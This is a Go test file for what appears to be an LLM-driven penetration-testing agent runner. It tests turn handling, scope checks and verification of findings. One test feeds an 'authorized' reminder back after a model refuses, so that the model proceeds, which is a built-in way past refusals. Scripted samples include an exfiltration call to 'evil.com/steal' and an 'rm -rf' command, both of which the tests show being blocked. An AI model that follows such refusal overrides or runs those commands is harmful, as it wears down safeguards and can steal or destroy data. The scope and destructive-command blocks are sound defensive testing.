package runtime

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"pentgo/internal/agent"
	"pentgo/skills"
)

func TestRunnerFeedsAssistantDecisionAndExecutionResultIntoNextTurn(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "先收集响应。\n```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE\n已经根据执行结果完成。"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block:    CodeBlock{Index: 1, Language: LanguagePython},
		Status:   ExecutionSucceeded,
		ExitCode: 0,
		Stdout:   "probe-result\n",
	}}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone || session.StopReason != "task_complete" || session.Turn != 2 {
		t.Fatalf("session = %+v", session)
	}
	if len(client.requests) != 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	second := client.requests[1].Messages
	if !containsMessage(second, "assistant", "先收集响应。\n```python\nimport os\nprint('probe')\n```") {
		t.Fatalf("assistant decision missing: %+v", second)
	}
	if !containsMessage(second, "user", "=== PENTGO EXECUTION RESULT ===\nturn: 1\nlanguage: python\nstatus: succeeded\nexit_code: 0\nstdout:\nprobe-result\nstderr:\n\n=== END PENTGO EXECUTION RESULT ===") {
		t.Fatalf("execution result missing: %+v", second)
	}
}

func TestRunnerRetriesProviderOnce(t *testing.T) {
	client := &scriptedClient{errors: []error{errors.New("temporary transport error")}, responses: []agent.Response{{Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), nil, func(context.Context, time.Duration) error { return nil })
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || session.Status != SessionDone {
		t.Fatalf("requests/session = %d/%+v", len(client.requests), session)
	}
}

func TestRunnerStopsAfterConfiguredNoCodeLimit(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "继续分析"}, {Content: "继续分析"}, {Content: "继续分析"}}}
	config := defaultRunnerConfig()
	config.NoCodeLimit = 3
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone || session.StopReason != "no_executable_response" || session.Turn != 3 {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerRunsUnboundedUntilCompletionWhenMaxTurnsZero(t *testing.T) {
	responses := make([]agent.Response, 0, 26)
	for i := 0; i < 25; i++ {
		responses = append(responses, agent.Response{Content: "```python\nimport os\nprint('probe')\n```"})
	}
	responses = append(responses, agent.Response{Content: "TASK_COMPLETE"})
	client := &scriptedClient{responses: responses}
	executor := &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "probe\n"}}}
	config := defaultRunnerConfig()
	config.MaxTurns = 0
	config.SoftStuckTurns = 1000
	config.HardStuckTurns = 1000
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone || session.Turn != 26 {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerInjectsSkillContextOnlyOnce(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "SKILL_LOAD: recon"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	loader := func(name string) (string, error) {
		if name != "recon" {
			t.Fatalf("skill = %q", name)
		}
		return "recon knowledge", nil
	}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), loader, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessage(client.requests[1].Messages, "user", "=== PENTGO SKILL CONTEXT ===\nskill: recon\nrecon knowledge\n=== END PENTGO SKILL CONTEXT ===") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerReturnsPreflightRejectionToModel(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('only text')\n```"}, {Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 4 || !containsMessageFragment(client.requests[1].Messages, "user", "PREFLIGHT REJECTED") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerRequiresExecutionEvidenceBeforeCompletion(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "evidence\n"}}}, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessageFragment(client.requests[1].Messages, "user", "EVIDENCE REQUIRED") || session.Status != SessionDone {
		t.Fatalf("requests/session = %+v/%+v", client.requests, session)
	}
}

func TestRunnerReturnsMixedPreflightOutcomesToTheExecutorAndHistory(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('reject')\n```\n```bash\necho accepted\n```"}, {Content: "TASK_COMPLETE"}}}
	executor := &recordingExecutor{results: []ExecutionResult{
		{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionPreflightRejected, ExitCode: -1, Error: "Python block has only print or placeholder code"},
		{Block: CodeBlock{Index: 2, Language: LanguageShell}, Status: ExecutionSucceeded, ExitCode: 0, Stdout: "accepted\n"},
	}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(executor.inputs) != 1 || len(executor.inputs[0].Blocks) != 2 || executor.inputs[0].Blocks[0].Approved || !executor.inputs[0].Blocks[1].Approved {
		t.Fatalf("executor inputs = %+v", executor.inputs)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "preflight_rejected") {
		t.Fatalf("history = %+v", client.requests[1].Messages)
	}
}

func TestRunnerInjectsSkillCatalogIntoSystemPrompt(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```python\nimport os\nprint('evidence')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	config := defaultRunnerConfig()
	config.SkillCatalog = []skills.Skill{{Name: "recon", Description: "信息收集方法论"}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "evidence\n"}}}, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) == 0 {
		t.Fatal("no requests recorded")
	}
	prompt := client.requests[0].SystemPrompt
	if !strings.Contains(prompt, "recon") || !strings.Contains(prompt, "信息收集方法论") {
		t.Fatalf("system prompt missing catalog: %s", prompt)
	}
}

func TestRunnerRecoversFromRefusalThenProceeds(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "I can't help with that."},
		{Content: "```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "probe\n"}}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone {
		t.Fatalf("session = %+v", session)
	}
	recovered := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "refusal_recovery" {
			recovered = true
		}
	}
	if !recovered {
		t.Fatalf("expected refusal_recovery event: %+v", session.Timeline)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "authorized") {
		t.Fatalf("authorization reminder not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerStopsAfterRefusalLimit(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "I can't help with that."},
		{Content: "I'm unable to assist."},
		{Content: "I must decline this request."},
	}}
	config := defaultRunnerConfig()
	config.RefusalLimit = 3
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionFailed || session.StopReason != "refused" {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerBlocksOutOfScopeCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "外联测试。\n```python\nimport requests\nrequests.get('https://evil.com/steal')\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = NewAuthorizer(false)
	config.AllowPrivateHosts = true
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone {
		t.Fatalf("session = %+v", session)
	}
	blocked := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "authorization_blocked" {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected authorization_blocked timeline event: %+v", session.Timeline)
	}
	if len(client.requests) < 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "out of authorized scope") {
		t.Fatalf("scope rejection not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerBlocksDestructiveCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```bash\nrm -rf /tmp/loot\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = NewAuthorizer(false)
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "destructive") {
		t.Fatalf("destructive rejection not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerCapsBlocksPerTurn(t *testing.T) {
	var blocks []string
	for i := 0; i < 5; i++ {
		blocks = append(blocks, "```python\nimport os\nprint('b"+string(rune('0'+i))+"')\n```")
	}
	client := &scriptedClient{responses: []agent.Response{
		{Content: strings.Join(blocks, "\n")},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "b0\n"}}}
	config := defaultRunnerConfig()
	config.MaxBlocksPerTurn = 2
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	capped := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "too_many_blocks" {
			capped = true
		}
	}
	if !capped {
		t.Fatalf("expected too_many_blocks event: %+v", session.Timeline)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "TOO MANY BLOCKS") {
		t.Fatalf("cap reminder not fed back: %+v", client.requests[1].Messages)
	}
	if got := executor.lastBlockCount(); got != 2 {
		t.Fatalf("executed %d blocks, want 2", got)
	}
}

func TestRunnerConsolidatesAndVerifiesFindings(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
method: GET
url: https://example.com/?q=payload
baseline_url: https://example.com/?q=benign
payload: payload
=== END PENTGO FINDING ===
=== PENTGO FINDING ===
type: sqli
method: GET
url: https://example.com/?id=1%27
baseline_url: https://example.com/?id=1
payload: id=1%27
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []VerificationResult{
		{Verdict: VerdictVerified, VulnType: VulnXSS},
		{Verdict: VerdictRefuted, VulnType: VulnSQLI},
	}}
	config := defaultRunnerConfig()
	config.MaxFindings = 2
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := NewSession(Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 2 || findings[0].Verdict != VerdictVerified || findings[1].Verdict != VerdictRefuted {
		t.Fatalf("findings = %+v", findings)
	}
	if len(verifier.specs) != 2 || len(client.requests) != 1 {
		t.Fatalf("verifier requests/specs = %d/%d", len(client.requests), len(verifier.specs))
	}
	if !containsMessageFragment(client.requests[0].Messages, "user", "PENTGO FINDING") {
		t.Fatalf("consolidation prompt missing: %+v", client.requests[0].Messages)
	}
}

func TestRunnerCapsConsolidatedFindings(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: `
=== PENTGO FINDING ===
type: xss
url: https://example.com/?q=one
payload: one
=== END PENTGO FINDING ===
=== PENTGO FINDING ===
type: xss
url: https://example.com/?q=two
payload: two
=== END PENTGO FINDING ===`}}}
	verifier := &recordingFindingVerifier{results: []VerificationResult{{Verdict: VerdictVerified, VulnType: VulnXSS}}}
	config := defaultRunnerConfig()
	config.MaxFindings = 1
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := NewSession(Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())
	session.Status = SessionDone

	findings := runner.ConsolidateAndVerify(context.Background(), session)
	if len(findings) != 1 || len(verifier.specs) != 1 {
		t.Fatalf("findings/specs = %d/%d", len(findings), len(verifier.specs))
	}
}

func TestRunnerSkipsConsolidationUntilSessionDone(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "unexpected"}}}
	verifier := &recordingFindingVerifier{}
	config := defaultRunnerConfig()
	config.Verifier = verifier
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	runner.history = NewHistory("https://example.com", "check target")
	session := NewSession(Target{Canonical: "https://example.com"}, "check target", time.Now().UTC())

	if findings := runner.ConsolidateAndVerify(context.Background(), session); findings != nil {
		t.Fatalf("findings = %+v", findings)
	}
	if len(client.requests) != 0 || len(verifier.specs) != 0 {
		t.Fatalf("requests/specs = %d/%d", len(client.requests), len(verifier.specs))
	}
}

type scriptedClient struct {
	responses []agent.Response
	errors    []error
	requests  []agent.Request
}

func (client *scriptedClient) Chat(_ context.Context, request agent.Request) (agent.Response, error) {
	copyRequest := request
	copyRequest.Messages = append([]agent.Message(nil), request.Messages...)
	client.requests = append(client.requests, copyRequest)
	if len(client.errors) > 0 {
		err := client.errors[0]
		client.errors = client.errors[1:]
		return agent.Response{}, err
	}
	response := client.responses[0]
	client.responses = client.responses[1:]
	return response, nil
}

type recordingExecutor struct {
	results []ExecutionResult
	inputs  []ExecutionInput
}

type recordingFindingVerifier struct {
	results []VerificationResult
	specs   []FindingSpec
}

func (verifier *recordingFindingVerifier) Verify(_ context.Context, spec FindingSpec) VerificationResult {
	verifier.specs = append(verifier.specs, spec)
	if len(verifier.results) == 0 {
		return VerificationResult{Verdict: VerdictInconclusive, VulnType: spec.VulnType}
	}
	result := verifier.results[0]
	verifier.results = verifier.results[1:]
	return result
}

func (executor *recordingExecutor) Execute(_ context.Context, input ExecutionInput) []ExecutionResult {
	executor.inputs = append(executor.inputs, input)
	return executor.results
}

func (executor *recordingExecutor) lastBlockCount() int {
	if len(executor.inputs) == 0 {
		return 0
	}
	return len(executor.inputs[len(executor.inputs)-1].Blocks)
}

func defaultRunnerConfig() RunnerConfig {
	return RunnerConfig{MaxTurns: 8, NoCodeLimit: 3, ProviderRetryDelay: time.Millisecond, NetworkBackoff: time.Millisecond, SoftStuckTurns: 3, HardStuckTurns: 5}
}

func containsMessage(messages []agent.Message, role, content string) bool {
	for _, message := range messages {
		if message.Role == role && strings.TrimSpace(message.Content) == strings.TrimSpace(content) {
			return true
		}
	}
	return false
}

func containsMessageFragment(messages []agent.Message, role, fragment string) bool {
	for _, message := range messages {
		if message.Role == role && strings.Contains(message.Content, fragment) {
			return true
		}
	}
	return false
}
